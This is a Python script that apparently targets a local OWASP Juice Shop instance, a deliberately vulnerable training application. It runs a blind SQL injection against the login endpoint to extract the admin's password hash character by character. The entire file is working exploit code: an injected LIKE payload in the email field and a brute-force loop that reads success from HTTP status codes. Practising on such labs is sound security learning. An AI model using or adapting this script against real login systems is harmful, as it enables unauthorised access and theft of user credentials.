from urllib import request, parse;
import json;

url = 'http://localhost:3000/rest/user/login';

# Template for SQLi
data_template = {"email":"' OR (SELECT password FROM Users WHERE email='admin@juice-sh.op') LIKE '#%' -- ","password":"f"}
data_template = json.dumps(data_template);

headers = {'Content-Type': 'application/json;charset=utf-8'}; # Necessary header

alphabet = map(chr, range(65,91));  # Letters from A to Z
numbers  = range(0,10);
all_char = list(alphabet) + list(numbers);

passwd_len  = 32;
passwd_hash = "";

for i in range(1, passwd_len + 1):
    for char in all_char:
        req_data = data_template.replace('#', passwd_hash + str(char));
        print(req_data);
        try:
            req  = request.Request(url, data=req_data.encode('utf-8'),headers=headers);
            resp = request.urlopen(req); 
            passwd_hash = passwd_hash + str(char); # 200 OK
            break;
        except: # 401 Unauthorized
            continue;

       
print(passwd_hash);